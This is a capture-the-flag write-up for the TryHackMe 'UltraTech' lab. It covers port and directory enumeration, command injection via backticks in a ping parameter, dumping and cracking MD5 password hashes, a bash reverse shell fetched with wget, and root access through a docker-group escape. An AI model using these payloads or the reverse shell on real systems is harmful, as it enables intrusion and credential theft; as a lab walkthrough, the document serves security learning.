---
description: >-
  The basics of Penetration Testing, Enumeration, Privilege Escalation and
  WebApp testing
---

# 1 - UltraTech

Difficulty: Medium.

Room Link --> [https://tryhackme.com/room/ultratech1](https://tryhackme.com/room/ultratech1)

### Nmap scan:

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -p- -T4 -sV 10.10.239.176

Host is up (0.18s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
{% endcode %}

Using \[gobuster] to search for hidden directories.

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.239.176:31331 -w /usr/share/wordlists/dirb/common.txt -t 200 2>/dev/null

===============================================================
2023/08/15 09:30:51 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 300]
/.htpasswd            (Status: 403) [Size: 300]
/css                  (Status: 301) [Size: 321] [--> http://10.10.239.176:31331/css/]
/favicon.ico          (Status: 200) [Size: 15086]
/images               (Status: 301) [Size: 324] [--> http://10.10.239.176:31331/images/]
/index.html           (Status: 200) [Size: 6092]
/javascript           (Status: 301) [Size: 328] [--> http://10.10.239.176:31331/javascript/]
/js                   (Status: 301) [Size: 320] [--> http://10.10.239.176:31331/js/]
/robots.txt           (Status: 200) [Size: 53]
/server-status        (Status: 403) [Size: 304]

===============================================================
2023/08/15 09:31:04 Finished
===============================================================
```
{% endcode %}

/robots.txt took me to "Sitemap: /utech\_sitemap.txt"

/utech\_sitemap.txt took me to "/partners.html" which led to a login page, but we don't have any credential.

/js took us to a dir with some .js files, taking a look at the "api.js" we found 2 functions making reference to 8081<"/ping" and "/auth"> directory. The "/ping" dir seem to be performing a ping with the "?ip=" parameter. ie ping?ip=

Lets try pinging our tun0 ip, we can use `sudo tcpdump -i tun0 icmp` to listen for pings.

and it went through, meaning the page is vulnerable to command injection (cmd injection).

{% code overflow="wrap" lineNumbers="true" %}
```
http://10.10.239.176:8081/ping?ip=10.18.88.214

PING 10.18.88.214 (10.18.88.214) 56(84) bytes of data. 64 bytes from 10.18.88.214: icmp_seq=1 ttl=63 time=163 ms --- 10.18.88.214 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 163.982/163.982/163.982/0.000 ms
```
{% endcode %}

### Initial Access

From here we can take 2 paths:

1. Do a cmd injection on the page and list the files on it, then can the .db file or,
2. Create a shell.sh script with a bash reverse shell in it, the execute it while listening on netcat.

#### Path 1

We use the \``ls` - backticks, so that our cmd takes precedence over the default ping function.

{% code overflow="wrap" lineNumbers="true" %}
```
http://10.10.239.176:8081/ping?ip=`ls`

we listed the file:
ping: utech.db.sqlite: Name or service not known.
```
{% endcode %}

Lets try to cat the content of the file.

{% code overflow="wrap" lineNumbers="true" %}
```
http://10.10.239.176:8081/ping?ip=`cat%20utech.db.sqlite`


we got:
ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
```
{% endcode %}

We can clearly see the username --> r00t and its pasword hash, then the user admin and its hash also. Since we need "r00t", we use \[hash-identifier] in kali to get the hash type.

{% code overflow="wrap" lineNumbers="true" %}
```bash
 HASH: f357a0c52799563c7c7b76c1e7543a32

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```
{% endcode %}

Its an MD5 hash, save it into a hash.txt file. I tried using john to crack, but john didnt work. So i used hashcat.

`hashcat -m 0 hash.txt /usr/share/wordlist/rockyou.txt` - and cracked it.

password --> n100906

we got the password, lets login via ssh. And we got in.

#### Path 2

We create a shell.sh script.

{% code title="shell.sh" overflow="wrap" lineNumbers="true" %}
```bash
# We use this bash onliner rev shell, and use my tun0 ip add and port 5555
bash -i >& /dev/tcp/10.18.88.214/5555 0>&1
```
{% endcode %}

Since we can execute cmds on the site, we use "wget" to download the script and then execute the shell.sh file with bash, while listening on netcat.

First we have to host shell.sh with python: `python3 -m http.server`&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://10.10.239.176:8081/ping?ip=`wget 10.18.88.214/shell.sh` 
http://10.10.239.176:8081/ping?ip=`bash shell.sh`
```
{% endcode %}

We get a shell :)

### Priv Esc

Since we are in docker group, we check gtfobin.

{% code overflow="wrap" lineNumbers="true" %}
```bash
docker image ls # we have a bash image.
docker run -v /:/mnt --rm -it bash chroot /mnt sh # we get root.
```
{% endcode %}

We can use locate to find the root user ssh private key.

`locate --all "id_rsa" /` - we get the key.

Done.
